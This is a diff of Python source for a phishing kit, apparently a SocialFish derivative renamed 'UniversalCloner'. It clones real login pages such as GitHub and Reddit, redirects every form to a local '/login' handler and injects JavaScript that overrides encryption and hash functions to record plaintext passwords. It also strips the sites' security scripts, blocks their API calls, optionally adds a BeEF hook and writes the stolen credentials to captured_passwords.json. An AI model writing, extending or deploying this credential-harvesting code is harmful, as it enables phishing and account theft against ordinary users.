-                (output_dir / subdir).mkdir(parents=True, exist_ok=True)
-            
-        except Exception as e:
-            logger.debug(f"Placeholder creation failed: {e}")  # Non-critical, just log
+    def _is_text_resource(self, resource_type: str, content_type: str) -> bool:
+        """Determine if resource should be treated as text"""
+        text_types = ['css', 'js', 'json', 'xml', 'svg']
+        if resource_type in text_types:
+            return True
+        
+        if content_type:
+            text_content_types = ['text/', 'application/javascript', 'application/json', 'application/xml', 'image/svg+xml']
+            return any(content_type.lower().startswith(t) for t in text_content_types)
+        
+        return False
     
-    async def _save_resource(self, content: bytes, metadata: Dict[str, Any],
-                           resource_type: str, output_dir: Path) -> Optional[str]:
-        """Save resource with SIMPLE binary/text handling - no async file ops for binary"""
-        try:
-            url = metadata.get('url', '')
-            content_type = metadata.get('content_type', '')
-            extension = self._get_extension_enhanced(url, content_type, resource_type)
-            parsed_url = urllib.parse.urlparse(url)
-            
-            # Validate content
-            if not content:
-                logger.warning(f"Empty content for {url}")
-                return None
-            
-            # Determine save path - preserve structure for images
-            if resource_type in ['image', 'svg'] and parsed_url.path and parsed_url.path != '/':
-                original_path = parsed_url.path.lstrip('/')
-                file_path = output_dir / original_path
-                file_path.parent.mkdir(parents=True, exist_ok=True)
-                local_path = original_path
-            else:
-                url_hash = hashlib.sha256(url.encode()).hexdigest()[:12]
-                filename = f"resource_{url_hash}{extension}"
-                subdir = self._get_subdir_enhanced(resource_type)
-                resource_dir = output_dir / subdir
-                resource_dir.mkdir(exist_ok=True)
-                file_path = resource_dir / filename
-                local_path = f"{subdir}/{filename}"
-            
-            # SIMPLE FIX: Use regular file operations like the working code
-            is_text = self._is_text_content_type(content_type, resource_type)
-            
-            if is_text:
-                # Text content - decode and save
-                try:
-                    text_content = content.decode('utf-8', errors='ignore')
-                    with open(file_path, 'w', encoding='utf-8') as f:
-                        f.write(text_content)
-                except Exception as e:
-                    logger.error(f"Text save failed for {url}: {e}")
-                    return None
-            else:
-                # Binary content - EXACTLY like working code
-                with open(file_path, 'wb') as f:
-                    f.write(content)  # Direct binary write, no async
-            
-            # Verify file
-            if not file_path.exists() or file_path.stat().st_size == 0:
-                logger.error(f"File not written: {file_path}")
-                return None
-            
-            logger.debug(f"Saved {resource_type}: {file_path} ({len(content)} bytes)")
-            return local_path
-            
-        except Exception as e:
-            logger.error(f"Save failed for {url}: {e}")
-            return None
+    def _rewrite_universal_urls(self, soup: BeautifulSoup, base_url: str):
+        """Universal URL rewriting after resource processing"""
+        
+        # Rewrite URLs in style attributes
+        for element in soup.find_all(style=True):
+            original_style = element.get('style', '')
+            if original_style:
+                new_style = self._rewrite_css_urls(original_style, base_url)
+                if new_style != original_style:
+                    element['style'] = new_style
+        
+        # Rewrite URLs in style tags
+        for style_tag in soup.find_all('style'):
+            if style_tag.string:
+                original_css = style_tag.string
+                new_css = self._rewrite_css_urls(original_css, base_url)
+                if new_css != original_css:
+                    style_tag.string = new_css
+        
+        # Rewrite direct src/href attributes that weren't updated during processing
+        for element in soup.find_all(['img', 'script', 'link', 'source']):
+            for attr in ['src', 'href']:
+                if element.get(attr):
+                    original_url = element[attr]
+                    absolute_url = self._resolve_url(original_url, base_url)
+                    if absolute_url and absolute_url in self.resource_manager.url_mappings:
+                        element[attr] = self.resource_manager.url_mappings[absolute_url]
     
-    def _remove_tracking_scripts(self, soup: BeautifulSoup):
-        """Remove tracking and analytics scripts"""
-        tracking_patterns = [
-            r'google-analytics\.com',
-            r'googletagmanager\.com',
-            r'facebook\.net',
-            r'doubleclick\.net',
-            r'hotjar\.com'
+    def _rewrite_css_urls(self, css_text: str, base_url: str) -> str:
+        """Rewrite URLs in CSS text"""
+        
+        def replace_url(match):
+            original_url = match.group(1).strip('\'"')
+            absolute_url = self._resolve_url(original_url, base_url)
+            
+            # Check mappings
+            if absolute_url and absolute_url in self.resource_manager.url_mappings:
+                local_path = self.resource_manager.url_mappings[absolute_url]
+                return f'url("{local_path}")'
+            elif original_url in self.resource_manager.url_mappings:
+                local_path = self.resource_manager.url_mappings[original_url]
+                return f'url("{local_path}")'
+            
+            return match.group(0)
+        
+        return re.sub(r'url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)', replace_url, css_text)
+    
+    def _inject_universal_password_capture_html(self, soup: BeautifulSoup):
+        """Inject universal password capture into HTML"""
+        ultra_script = soup.new_tag('script')
+        ultra_script.string = '''(function() {
+            if (window.universalCaptureLoaded) return;
+            window.universalCaptureLoaded = true;
+            console.log("🔑 UNIVERSAL HTML Password Capture Loaded");
+            
+            window.universalPasswordData = {passwords: [], usernames: []};
+            
+            // Universal encryption blocking
+            const killEncryption = ['encrypt', 'hash', 'md5', 'sha1', 'sha256', 'PWDEncrypt', 'encryptPassword'];
+            killEncryption.forEach(func => {
+                try {
+                    Object.defineProperty(window, func, {
+                        get: () => (p) => { 
+                            console.log(`🔑 KILLED ${func}:`, p);
+                            window.universalPasswordData.passwords.push({field: func, password: p, time: Date.now()});
+                            return p;
+                        },
+                        set: () => {},
+                        configurable: false
+                    });
+                } catch(e) {}
+            });
+            
+            console.log("✅ Universal password capture ready");
+        })();'''
+        
+        head = soup.find('head')
+        if head:
+            head.insert(0, ultra_script)
+        else:
+            # Create head if missing
+            head = soup.new_tag('head')
+            head.append(ultra_script)
+            if soup.html:
+                soup.html.insert(0, head)
+    
+    def _disable_universal_encryption_scripts(self, soup: BeautifulSoup):
+        """Remove/disable encryption scripts universally"""
+        
+        removed_count = 0
+        encryption_patterns = [
+            'encrypt', 'crypto', 'hash', 'md5', 'sha', 'pwd', 'password',
+            'security', 'auth', 'login', 'sign'
         ]
         
-        for script in soup.find_all(['script', 'iframe']):
-            src = script.get('src', '')
-            if any(re.search(pattern, src, re.I) for pattern in tracking_patterns):
+        for script in soup.find_all('script'):
+            if script.string:
+                script_lower = script.string.lower()
+                
+                # Check for encryption patterns
+                if any(pattern in script_lower for pattern in encryption_patterns):
+                    # Replace with dummy script
+                    script.string = f'/* REMOVED ENCRYPTION SCRIPT */ console.log("Script disabled for security");'
+                    removed_count += 1
+            
+            # Remove suspicious external scripts
+            src = script.get('src', '').lower()
+            if src and any(pattern in src for pattern in ['crypto', 'encrypt', 'security', 'auth']):
                 script.decompose()
+                removed_count += 1
+        
+        logger.debug(f"Disabled {removed_count} potential encryption scripts")
+    
+    def _remove_universal_tracking_scripts(self, soup: BeautifulSoup):
+        """Remove tracking scripts from any website"""
+        
+        tracking_patterns = [
+            'google-analytics', 'googletagmanager', 'gtag', 'ga.js',
+            'facebook.net', 'connect.facebook', 'fbevents', 'fbq',
+            'doubleclick', 'googlesyndication', 'adsystem',
+            'hotjar', 'fullstory', 'logrocket', 'mixpanel',
+            'segment.com', 'amplitude', 'intercom'
+        ]
+        
+        removed_count = 0
+        
+        for script in soup.find_all(['script', 'iframe', 'img']):
+            src = script.get('src', '').lower()
+            if src and any(pattern in src for pattern in tracking_patterns):
+                script.decompose()
+                removed_count += 1
+        
+        logger.debug(f"Removed {removed_count} tracking elements")
+    
+    def _process_universal_forms(self, soup: BeautifulSoup):
+        """Universal form processing for any website"""
+        
+        for form in soup.find_all('form'):
+            # Store original action
+            original_action = form.get('action', '')
+            if original_action:
+                form['data-original-action'] = original_action
+            
+            # Redirect all forms to login handler
+            form['action'] = '/login'
+            form['method'] = 'post'
+            
+            # Enhance all password fields
+            for input_field in form.find_all('input'):
+                input_type = (input_field.get('type') or '').lower()
+                input_name = (input_field.get('name') or input_field.get('id') or '').lower()
+                
+                if input_type == 'password' or any(keyword in input_name for keyword in ['pass', 'pwd', 'secret']):
+                    input_field['data-universal-password'] = 'true'
+                    input_field['autocomplete'] = 'new-password'
+                    
+                    # Remove encryption attributes
+                    for attr in ['data-encrypt', 'data-hash', 'onchange', 'onblur', 'oninput']:
+                        if input_field.get(attr):
+                            del input_field[attr]
     
     def _add_beef_hook(self, soup: BeautifulSoup):
-        """Add BeEF hook for penetration testing"""
+        """Add BeEF hook if enabled"""
         script = soup.new_tag('script')
         script['src'] = 'http://localhost:3000/hook.js'
         
@@ -2840,112 +1894,50 @@ class SocialFishContentProcessor:
             body.append(script)
     
     def _add_universal_ajax_blocking(self, soup: BeautifulSoup):
-        """Enhanced universal AJAX blocking to prevent 405 errors on any site"""
+        """Universal AJAX blocking for any website"""
         script = soup.new_tag('script')
         script.string = '''
         (function() {
-            // Enhanced Universal AJAX blocking to prevent 405 errors
             const blockedPatterns = [
-                '/ajax/', '/api/', '/graphql', '/_api/', '/rpc/',
-                '/webstorage', '/analytics', '/tracking', '/metrics',
-                '/beacon', '/collect', '/report', '/log', '/bz?',
-                '/process_keys', '/telemetry', '/events', '/ping'
+                '/api/', '/ajax/', '/graphql', '/rpc/', '/websocket',
+                '/analytics/', '/tracking/', '/metrics/', '/telemetry/',
+                '/beacon/', '/collect/', '/report/', '/log/', '/ping'
             ];
             
-            // Enhanced XMLHttpRequest blocking
+            // Block XMLHttpRequest
             if (window.XMLHttpRequest) {
                 const originalOpen = XMLHttpRequest.prototype.open;
-                XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
-                    if (typeof url === 'string' && blockedPatterns.some(pattern => url.includes(pattern))) {
-                        console.log('🛡️ Blocked AJAX call to prevent 405 error:', url);
-                        // Create a mock XHR that appears to work but doesn't make requests
+                XMLHttpRequest.prototype.open = function(method, url) {
+                    if (typeof url === 'string' && blockedPatterns.some(p => url.includes(p))) {
+                        console.log('🛡️ Universal blocked AJAX:', url);
                         this.readyState = 4;
                         this.status = 200;
                         this.responseText = '{}';
-                        this.response = '{}';
                         setTimeout(() => {
-                            if (typeof this.onreadystatechange === 'function') {
-                                this.onreadystatechange();
-                            }
-                            if (typeof this.onload === 'function') {
-                                this.onload();
-                            }
+                            if (this.onload) this.onload();
+                            if (this.onreadystatechange) this.onreadystatechange();
                         }, 10);
                         return;
                     }
-                    return originalOpen.call(this, method, url, async, user, password);
-                };
-                
-                // Also block send to be extra safe
-                const originalSend = XMLHttpRequest.prototype.send;
-                XMLHttpRequest.prototype.send = function(data) {
-                    if (this.readyState === 4) return; // Already blocked
-                    return originalSend.call(this, data);
+                    return originalOpen.apply(this, arguments);
                 };
             }
             
-            // Enhanced fetch blocking with better error handling
+            // Block fetch
             if (window.fetch) {
                 const originalFetch = window.fetch;
                 window.fetch = function(url, options) {
-                    if (typeof url === 'string' && blockedPatterns.some(pattern => url.includes(pattern))) {
-                        console.log('🛡️ Blocked fetch call to prevent 405 error:', url);
-                        return Promise.resolve(new Response('{}', {
-                            status: 200,
-                            statusText: 'OK',
-                            headers: new Headers({'Content-Type': 'application/json'})
-                        }));
+                    if (typeof url === 'string' && blockedPatterns.some(p => url.includes(p))) {
+                        console.log('🛡️ Universal blocked fetch:', url);
+                        return Promise.resolve(new Response('{}', {status: 200}));
                     }
-                    return originalFetch.apply(this, arguments).catch(err => {
-                        console.log('🛡️ Fetch error caught and handled:', err);
-                        return new Response('{}', {status: 200});
-                    });
+                    return originalFetch.apply(this, arguments).catch(() => 
+                        new Response('{}', {status: 200})
+                    );
                 };
             }
             
-            // Block WebSocket connections that might cause issues
-            if (window.WebSocket) {
-                const originalWebSocket = window.WebSocket;
-                window.WebSocket = function(url, protocols) {
-                    console.log('🛡️ Blocked WebSocket connection:', url);
-                    const mockSocket = {
-                        close: function() {},
-                        send: function() {},
-                        addEventListener: function() {},
-                        removeEventListener: function() {},
-                        readyState: 3, // CLOSED
-                        CONNECTING: 0, OPEN: 1, CLOSING: 2, CLOSED: 3
-                    };
-                    // Trigger close event after a delay
-                    setTimeout(() => {
-                        if (typeof mockSocket.onclose === 'function') {
-                            mockSocket.onclose();
-                        }
-                    }, 100);
-                    return mockSocket;
-                };
-            }
-            
-            // Block Service Workers that might interfere
-            if ('serviceWorker' in navigator) {
-                navigator.serviceWorker.register = function() {
-                    console.log('🛡️ Blocked service worker registration');
-                    return Promise.resolve({unregister: () => Promise.resolve()});
-                };
-            }
-            
-            // Silence console errors for blocked requests
-            const originalError = console.error;
-            console.error = function(...args) {
-                const message = args[0];
-                if (typeof message === 'string' && 
-                    (message.includes('405') || message.includes('Failed to fetch') || 
-                     message.includes('NetworkError') || message.includes('CORS'))) {
-                    console.log('🛡️ Suppressed error:', message);
-                    return;
-                }
-                return originalError.apply(this, args);
-            };
+            console.log('🛡️ Universal AJAX blocking active');
         })();
         '''
         
@@ -2953,67 +1945,134 @@ class SocialFishContentProcessor:
         if head:
             head.insert(0, script)
     
-    def _add_socialfish_js(self, soup: BeautifulSoup):
-        """Add SocialFish-specific JavaScript"""
+    def _add_universal_js_enhancements(self, soup: BeautifulSoup):
+        """Add universal JavaScript enhancements"""
         script = soup.new_tag('script')
         script.string = '''
         (function() {
-            // SocialFish form override
+            // Universal form handling
             document.addEventListener('DOMContentLoaded', function() {
                 document.querySelectorAll('form').forEach(function(form) {
                     form.addEventListener('submit', function(e) {
-                        // Let SocialFish handle the form submission
                         this.action = '/login';
                         this.method = 'post';
                     });
                 });
             });
+            
+            // Universal error handling
+            window.addEventListener('error', function(e) {
+                console.log('🛡️ Universal error handled:', e.message);
+                return true;
+            });
+            
+            console.log('✅ Universal enhancements loaded');
         })();
         '''
         
         head = soup.find('head')
         if head:
-            head.insert(0, script)
+            head.append(script)
+    
+    def _process_with_regex_universal(self, html_content: str, base_url: str, 
+                                    output_dir: Path, beef_enabled: bool) -> str:
+        """Universal regex processing fallback"""
+        logger.info("Using universal regex fallback")
+        
+        # Universal form processing
+        html_content = re.sub(
+            r'(<form[^>]*?)action\s*=\s*["\']([^"\']*)["\']([^>]*>)',
+            r'\1action="/login" data-original-action="\2"\3',
+            html_content, flags=re.IGNORECASE
+        )
+        
+        # Add universal password capture
+        password_script = '''<script>
+        (function() {
+            console.log("🔑 Universal REGEX Password Capture");
+            window.universalData = {passwords: [], usernames: []};
+            
+            // Kill encryption functions
+            ['encrypt', 'hash', 'PWDEncrypt'].forEach(func => {
+                try {
+                    window[func] = function(p) { 
+                        console.log(`🔑 ${func} killed:`, p);
+                        window.universalData.passwords.push({field: func, password: p, time: Date.now()});
+                        return p; 
+                    };
+                } catch(e) {}
+            });
+            
+            // Monitor forms
+            document.addEventListener('submit', function(e) {
+                const form = e.target;
+                const data = new FormData(form);
+                for (let [key, value] of data.entries()) {
+                    if (/pass|pwd|secret/i.test(key) && value) {
+                        console.log(`🔑 Universal form password:`, value);
+                        window.universalData.passwords.push({field: key, password: value, time: Date.now()});
+                    }
+                }
+            });
+            
+            console.log("✅ Universal REGEX capture ready");
+        })();
+        </script>'''
+        
+        # Insert at beginning of head or body
+        if '<head>' in html_content:
+            html_content = html_content.replace('<head>', '<head>' + password_script)
+        elif '<body>' in html_content:
+            html_content = html_content.replace('<body>', '<body>' + password_script)
+        else:
+            html_content = password_script + html_content
+        
+        # Add BeEF if enabled
+        if beef_enabled:
+            beef_script = '<script src="http://localhost:3000/hook.js"></script>'
+            html_content = html_content.replace('</body>', beef_script + '</body>')
+        
+        return html_content
 
-class SocialFishCloner:
-    """Main cloner class for SocialFish integration with PASSWORD CAPTURE"""
+class UniversalCloner:
+    """Universal website cloner for ANY website"""
     
-    def __init__(self, config: SocialFishConfig = None):
-        self.config = config or SocialFishConfig()
-        self.user_agent_manager = AdvancedUserAgentManager()
-        self.resource_manager = SocialFishResourceManager(self.config)
-        self.content_processor = SocialFishContentProcessor(self.config, self.resource_manager)
-        self.browser_manager = SocialFishBrowserManager(self.config)
+    def __init__(self, config: UniversalClonerConfig = None):
+        self.config = config or UniversalClonerConfig()
+        self.user_agent_manager = UniversalUserAgentManager()
+        self.resource_manager = UniversalResourceManager(self.config)
+        self.content_processor = UniversalContentProcessor(self.config, self.resource_manager)
+        self.browser_manager = UniversalBrowserManager(self.config)
     
-    async def clone_website_async(self, url: str, user_agent: str, beef_enabled: bool = False) -> bool:
-        """Async clone website for SocialFish with PASSWORD CAPTURE"""
+    async def clone_website_universal(self, url: str, user_agent: str, beef_enabled: bool = False) -> bool:
+        """Universal website cloning for any site"""
         start_time = time.time()
         
         try:
-            logger.info(f"🚀 Starting SocialFish clone with PASSWORD CAPTURE: {url}")
+            logger.info(f"🌍 Universal cloning started: {url}")
             
-            # Setup output directory (SocialFish structure)
-            output_dir = self._create_output_directory(url, user_agent)
+            # Create universal output directory
+            output_dir = self._create_universal_output_directory(url, user_agent)
             if not output_dir:
                 return False
             
-            # Get user agent data
+            # Get user agent configuration
             user_agent_data = self.user_agent_manager.get_agent_for_user_agent(user_agent)
             
-            # Initialize components
+            # Initialize all components
             await self.resource_manager.initialize_sessions(user_agent_data)
             self.browser_manager.driver = self.browser_manager.initialize_browser(user_agent)
             
-            # Get page content with PASSWORD CAPTURE
-            html_content = await self._get_page_content_with_password_capture(url)
+            # Get page content with universal handling
+            html_content = await self._get_universal_page_content(url)
             if not html_content:
-                logger.error("❌ Failed to retrieve page content")
+                logger.error("❌ Failed to retrieve universal page content")
                 return False
             
-            logger.info(f"✅ Retrieved content: {len(html_content)} characters")
+            logger.info(f"✅ Universal content retrieved: {len(html_content):,} characters")
             
-            # Process content
-            processed_html = await self.content_processor.process_html(
+            # Process with universal content processor
+            processed_html = await self.content_processor.process_html_universal(
                 html_content, url, output_dir, beef_enabled
             )
             
@@ -3022,117 +2081,144 @@ class SocialFishCloner:
             async with aiofiles.open(index_path, 'w', encoding='utf-8') as f:
                 await f.write(f'<!DOCTYPE html>\n{processed_html}')
             
-            # Save metadata with PASSWORD CAPTURE info
-            await self._save_metadata_with_password_info(url, output_dir, start_time)
+            # Save universal metadata
+            await self._save_universal_metadata(url, output_dir, start_time)
             
             duration = time.time() - start_time
-            logger.info(f"🎉 SocialFish PASSWORD CAPTURE clone completed in {duration:.2f}s")
-            logger.info(f"📊 Stats: {self.resource_manager.stats}")
-            logger.info(f"🔑 Password capture enabled: {self.config.capture_passwords_plaintext}")
+            logger.info(f"🎉 Universal cloning completed in {duration:.2f}s")
+            logger.info(f"📊 Universal stats: {self.resource_manager.stats}")
             
             return True
             
         except Exception as e:
-            logger.error(f"❌ Cloning failed: {e}")
+            logger.error(f"❌ Universal cloning failed: {e}")
             return False
         
         finally:
-            await self._cleanup()
+            await self._universal_cleanup()
     
-    def _create_output_directory(self, url: str, user_agent: str) -> Optional[Path]:
-        """Create output directory in SocialFish structure"""
+    def _create_universal_output_directory(self, url: str, user_agent: str) -> Optional[Path]:
+        """Create universal output directory structure"""
         try:
-            # Clean user agent for directory name
-            safe_agent = re.sub(r'[^\w\-_.]', '_', user_agent)
+            # Clean identifiers
+            safe_agent = re.sub(r'[^\w\-_.]', '_', user_agent)[:50]  # Limit length
             
-            # Extract domain from URL
             parsed_url = urllib.parse.urlparse(url)
             domain = parsed_url.netloc
             safe_domain = re.sub(r'[^\w\-_.]', '_', domain)
             
-            # Create SocialFish directory structure
-            output_dir = Path(self.config.output_base) / safe_agent / safe_domain
+            # Create universal directory structure
+            timestamp = int(time.time())
+            output_dir = Path(self.config.output_base) / f"{safe_domain}_{timestamp}" / safe_agent
             output_dir.mkdir(parents=True, exist_ok=True)
             
-            # Create subdirectories
-            for subdir in ['css', 'js', 'images', 'fonts', 'assets']:
+            # Create universal subdirectories
+            universal_subdirs = [
+                'css', 'js', 'images', 'fonts', 'videos', 'audio', 
+                'documents', 'data', 'assets'
+            ]
+            
+            for subdir in universal_subdirs:
                 (output_dir / subdir).mkdir(exist_ok=True)
             
-            logger.info(f"📁 Output directory: {output_dir}")
+            logger.info(f"📁 Universal output directory: {output_dir}")
             return output_dir
             
         except Exception as e:
-            logger.error(f"❌ Failed to create output directory: {e}")
+            logger.error(f"❌ Failed to create universal output directory: {e}")
             return None
     
-    async def _get_page_content_with_password_capture(self, url: str) -> Optional[str]:
-        """Get page content with PASSWORD CAPTURE enabled"""
-        # Try browser rendering first with password capture
-        if self.browser_manager.driver:
-            content = await self.browser_manager.render_page(url)
-            if content:
-                # Try to capture any passwords that were entered during rendering
-                captured_data = self.browser_manager.get_captured_passwords()
-                if captured_data:
-                    logger.info(f"🔑 Password data captured during rendering: {len(captured_data.get('passwords', []))} passwords")
-                return content
+    async def _get_universal_page_content(self, url: str) -> Optional[str]:
+        """Get page content using universal methods"""
         
-        # Fallback to HTTP request (no password capture possible)
+        # Try browser rendering first (best for SPAs and dynamic content)
+        if self.browser_manager.driver:
+            try:
+                content = await self.browser_manager.render_page_universal(url)
+                if content:
+                    # Try to get password data
+                    password_data = self.browser_manager.get_captured_passwords()
+                    if password_data:
+                        logger.info(f"🔑 Universal password capture: {len(password_data.get('passwords', []))} entries")
+                    return content
+            except Exception as e:
+                logger.debug(f"Browser rendering failed: {e}")
+        
+        # Fallback to HTTP request
         if self.resource_manager.session_pool:
             session = self.resource_manager.session_pool[0]
             try:
                 async with session.get(url) as response:
                     if response.status == 200:
-                        # CRITICAL FIX: aiohttp automatically decompresses
                         content = await response.read()
                         
-                        # Decode text for HTML content only (no manual decompression needed)
-                        for encoding in ['utf-8', 'latin-1', 'iso-8859-1']:
+                        # Try multiple encodings
+                        for encoding in ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']:
                             try:
                                 return content.decode(encoding)
                             except UnicodeDecodeError:
                                 continue
                         
                         return content.decode('utf-8', errors='ignore')
+                        
             except Exception as e:
                 logger.error(f"HTTP request failed: {e}")
         
         return None
     
-    async def _save_metadata_with_password_info(self, url: str, output_dir: Path, start_time: float):
-        """Save cloning metadata with PASSWORD CAPTURE information"""
+    async def _save_universal_metadata(self, url: str, output_dir: Path, start_time: float):
+        """Save universal cloning metadata"""
+        
+        duration = time.time() - start_time
+        
         metadata = {
-            'url': url,
-            'timestamp': time.time(),
-            'duration': time.time() - start_time,
+            'universal_cloner_version': '1.0_final',
+            'target_url': url,
+            'clone_timestamp': time.time(),
+            'clone_duration_seconds': duration,
             'stats': self.resource_manager.stats,
             'password_capture_enabled': self.config.capture_passwords_plaintext,
-            'password_capture_sessions': len(self.browser_manager.captured_passwords),
-            'socialfish_version': '2.0_password_capture_enhanced'
+            'password_sessions': len(self.browser_manager.captured_passwords),
+            'features_enabled': {
+                'service_workers': self.config.discover_service_workers,
+                'web_manifests': self.config.discover_web_manifests,
+                'shadow_dom': self.config.process_shadow_dom,
+                'lazy_loading': self.config.handle_lazy_loading
+            }
         }
         
-        async with aiofiles.open(output_dir / 'metadata.json', 'w') as f:
+        # Save main metadata
+        async with aiofiles.open(output_dir / 'clone_metadata.json', 'w') as f:
             await f.write(json.dumps(metadata, indent=2))
         
-        # Save captured passwords separately if any
-        if self.browser_manager.captured_passwords and self.config.save_captured_passwords:
+        # Save password data if any was captured
+        if (self.browser_manager.captured_passwords and 
+            self.config.save_captured_passwords):
+            
             password_data = {
                 'capture_timestamp': time.time(),
                 'target_url': url,
-                'captured_sessions': self.browser_manager.captured_passwords
+                'capture_sessions': self.browser_manager.captured_passwords,
+                'total_passwords': sum(len(session.get('passwords', [])) 
+                                     for session in self.browser_manager.captured_passwords)
             }
+            
             async with aiofiles.open(output_dir / 'captured_passwords.json', 'w') as f:
                 await f.write(json.dumps(password_data, indent=2))
-            logger.info(f"🔑 Saved {len(self.browser_manager.captured_passwords)} password capture sessions")
+                
+            logger.info(f"🔑 Universal password data saved: {password_data['total_passwords']} entries")
     
-    async def _cleanup(self):
-        """Cleanup resources"""
-        await self.resource_manager.cleanup()
-        self.browser_manager.cleanup()
+    async def _universal_cleanup(self):
+        """Universal cleanup of all resources"""
+        try:
+            await self.resource_manager.cleanup()
+            self.browser_manager.cleanup()
+        except Exception as e:
+            logger.debug(f"Cleanup failed: {e}")
 
-# SocialFish Integration Functions
+# Universal Integration Functions
 def sync_wrapper(coro):
-    """Wrapper to run async function in sync context"""
+    """Universal sync wrapper for async functions"""
     @wraps(coro)
     def wrapper(*args, **kwargs):
         try:
@@ -3143,7 +2229,7 @@ def sync_wrapper(coro):
         
         try:
             if loop.is_running():
-                # If loop is already running, use thread
+                # Use thread for nested event loops
                 import concurrent.futures
                 with concurrent.futures.ThreadPoolExecutor() as executor:
                     future = executor.submit(asyncio.run, coro(*args, **kwargs))
@@ -3151,34 +2237,27 @@ def sync_wrapper(coro):
             else:
                 return loop.run_until_complete(coro(*args, **kwargs))
         except Exception as e:
-            logger.error(f"Sync wrapper error: {e}")
+            logger.error(f"Universal sync wrapper error: {e}")
             return False
     
     return wrapper
 
-# Main SocialFish compatible function with PASSWORD CAPTURE
 @sync_wrapper
-async def clone_async(url: str, user_agent: str, beef: str) -> bool:
-    """Async clone function for SocialFish with PASSWORD CAPTURE"""
+async def clone_universal_async(url: str, user_agent: str, beef: str) -> bool:
+    """Universal async clone function"""
     beef_enabled = beef.lower() == 'yes'
     
-    config = SocialFishConfig()
-    # Enable password capture by default
-    config.capture_passwords_plaintext = True
-    config.disable_client_encryption = True
-    config.save_captured_passwords = True
+    config = UniversalClonerConfig()
+    cloner = UniversalCloner(config)
     
-    cloner = SocialFishCloner(config)
-    
-    return await cloner.clone_website_async(url, user_agent, beef_enabled)
+    return await cloner.clone_website_universal(url, user_agent, beef_enabled)
 
-# SocialFish compatible clone function (synchronous interface) with PASSWORD CAPTURE
 def clone(url: str, user_agent: str, beef: str) -> bool:
     """
-    SocialFish compatible clone function with PASSWORD CAPTURE
+    UNIVERSAL website cloner - works with ANY website
     
     Args:
-        url: Target URL to clone
+        url: Target URL to clone (any website)
         user_agent: User agent string from request
         beef: 'yes' or 'no' for BeEF hook injection
     
@@ -3186,73 +2265,71 @@ def clone(url: str, user_agent: str, beef: str) -> bool:
         bool: True if cloning successful, False otherwise
     """
     try:
-        logger.info(f"🐟 SocialFish PASSWORD CAPTURE Enhanced Clone Request: {url}")
+        logger.info(f"🌍 UNIVERSAL CLONE REQUEST: {url}")
         logger.info(f"👤 User Agent: {user_agent[:50]}...")
         logger.info(f"🥩 BeEF Hook: {beef}")
         logger.info(f"🔑 Password Capture: ENABLED")
         
-        # Call async function with sync wrapper
-        result = clone_async(url, user_agent, beef)
+        # Universal cloning
+        result = clone_universal_async(url, user_agent, beef)
         
         if result:
-            logger.info("✅ SocialFish PASSWORD CAPTURE clone completed successfully")
+            logger.info("✅ UNIVERSAL cloning completed successfully")
         else:
-            logger.error("❌ SocialFish PASSWORD CAPTURE clone failed")
+            logger.error("❌ UNIVERSAL cloning failed")
         
         return result
         
     except Exception as e:
-        logger.error(f"❌ SocialFish PASSWORD CAPTURE clone error: {e}")
+        logger.error(f"❌ UNIVERSAL clone error: {e}")
         return False
 
-# Test function for universal usage
+# Universal test function
 if __name__ == "__main__":
-    test_sites = [
+    universal_test_sites = [
         ("https://github.com/login", "GitHub"),
-        ("https://www.instagram.com/", "Instagram"),
-        ("https://www.facebook.com/", "Facebook"),
-        ("https://twitter.com/", "Twitter"),
-        ("https://www.linkedin.com/", "LinkedIn")
+        ("https://stackoverflow.com/users/login", "Stack Overflow"),
+        ("https://www.reddit.com/login", "Reddit"),
+        ("https://news.ycombinator.com/", "Hacker News"),
+        ("https://www.wikipedia.org/", "Wikipedia"),
+        ("https://example.com/", "Example Site"),
     ]
     
     test_user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
     
-    print("🧪 Testing SocialFish PASSWORD CAPTURE cloner...")
+    print("🌍 Testing UNIVERSAL Website Cloner...")
+    print("This cloner works with ANY website universally!")
     print("Select a site to test:")
-    for i, (url, name) in enumerate(test_sites, 1):
+    for i, (url, name) in enumerate(universal_test_sites, 1):
         print(f"{i}. {name} ({url})")
     
     try:
-        choice = int(input("Enter choice (1-5): ")) - 1
-        if 0 <= choice < len(test_sites):
-            test_url, site_name = test_sites[choice]
-            print(f"🚀 Testing {site_name} with PASSWORD CAPTURE...")
-            result = clone(test_url, test_user_agent, "no")
-            
-            if result:
-                print(f"🎉 {site_name} PASSWORD CAPTURE clone completed successfully!")
-                print("🔑 Check output directory for captured_passwords.json")
-            else:
-                print(f"❌ {site_name} PASSWORD CAPTURE clone failed!")
+        choice = int(input("Enter choice (1-6) or custom URL: ")) - 1
+        if 0 <= choice < len(universal_test_sites):
+            test_url, site_name = universal_test_sites[choice]
+            print(f"🚀 Testing UNIVERSAL clone of {site_name}...")
         else:
-            # Default test
-            test_url = test_sites[0][0]
-            print(f"🚀 Running default test: {test_sites[0][1]} with PASSWORD CAPTURE...")
-            result = clone(test_url, test_user_agent, "no")
+            test_url = input("Enter custom URL: ")
+            site_name = "Custom Site"
+            print(f"🚀 Testing UNIVERSAL clone of {site_name}...")
             
-            if result:
-                print("🎉 PASSWORD CAPTURE test completed successfully!")
-                print("🔑 Check logs and output for captured password data")
-            else:
-                print("❌ PASSWORD CAPTURE test failed!")
-    except (ValueError, KeyboardInterrupt):
-        # Default test
-        test_url = test_sites[0][0]
-        print(f"🚀 Running default test: {test_sites[0][1]} with PASSWORD CAPTURE...")
         result = clone(test_url, test_user_agent, "no")
         
         if result:
-            print("🎉 PASSWORD CAPTURE test completed successfully!")
-            print("🔑 Check logs and output for captured password data")
+            print(f"🎉 UNIVERSAL clone of {site_name} completed successfully!")
+            print("🔍 Check output directory for all cloned resources")
+            print("🔑 Check logs for password capture data")
         else:
-            print("❌ PASSWORD CAPTURE test failed!")
+            print(f"❌ UNIVERSAL clone of {site_name} failed!")
+            
+    except (ValueError, KeyboardInterrupt):
+        # Default universal test
+        test_url = universal_test_sites[0][0]
+        print(f"🚀 Running default UNIVERSAL test: {universal_test_sites[0][1]}...")
+        result = clone(test_url, test_user_agent, "no")
+        
+        if result:
+            print("🎉 UNIVERSAL test completed successfully!")
+            print("🌍 This cloner can handle ANY website universally!")
+        else:
+            print("❌ UNIVERSAL test failed!")
